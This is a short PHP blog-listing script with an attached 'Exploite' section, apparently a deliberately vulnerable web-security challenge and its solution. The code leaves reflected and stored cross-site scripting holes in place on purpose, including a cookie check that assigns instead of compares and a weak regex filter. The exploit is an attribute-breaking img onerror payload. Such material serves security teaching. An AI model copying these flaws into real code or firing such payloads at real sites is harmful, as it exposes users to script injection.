```php
<?php
include 'connectioni.php';

if (isset($_GET['author'])) {
    $stmt = $link->prepare('SELECT name,username FROM tblMembers WHERE id = ?;');
    $stmt->bind_param('i', $_GET['author']);
    $stmt->execute();
    $userResult = $stmt->get_result();
    $userRow = $userResult->fetch_assoc();
    echo '<strong>Viewing all posts by ' . $userRow['name'] . ' (' . $userRow['username'] . ')</strong><br /><br />';

    $stmt = $link->prepare('SELECT * FROM tblBlogs WHERE author =  ?;');
    $stmt->bind_param('i', $_GET['author']);
}
else {
    $stmt = $link->prepare('SELECT * FROM tblBlogs;');
}
$stmt->execute();
$result = $stmt->get_result();

if (mysqli_num_rows($result) == 0) {
    if ($_COOKIE["level"] = "1") {
        echo 'Couldn\'t find any posts by author: <span class="author-' . $_GET['author'] .'">' . htmlentities($_GET['author']) . '</span>.';
    }
    else {
        $author = $_GET["author"];
        $author = preg_replace("/<[A-Za-z0-9]/" , "", $author);
        $author = preg_replace("/on([a-z]+)/", "", $author);
        echo 'Couldn\'t find any posts by author: <span class="author-' . $author .'">' . htmlentities($author) . '</span>.';
    }
}

if (!$result) {
    echo "DB Error, could not query the database\n";
    echo 'MySQL Error: ' . htmlentities(mysql_error());
    exit;
}

while ($row = $result->fetch_assoc()) {
    $stmt = $link->prepare('SELECT name,username FROM tblMembers WHERE id =  ?;');
    $stmt->bind_param('i', $row['author']);
    $stmt->execute();
    $checkResult = $stmt->get_result();
    $checkRow = $checkResult->fetch_assoc();
    echo '<div class="list-blog">';
    echo '<strong>' . $row['title'] . '</strong> by <a href=/blog.php?author=' .$row['author'] . '>' . $checkRow['name'] . '</a><br /><br />';
    echo $row['content'] . '<br /></div>';
}

?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```text
author=mytext"><img/src/onerror=alert(1)>
  ```
</details>
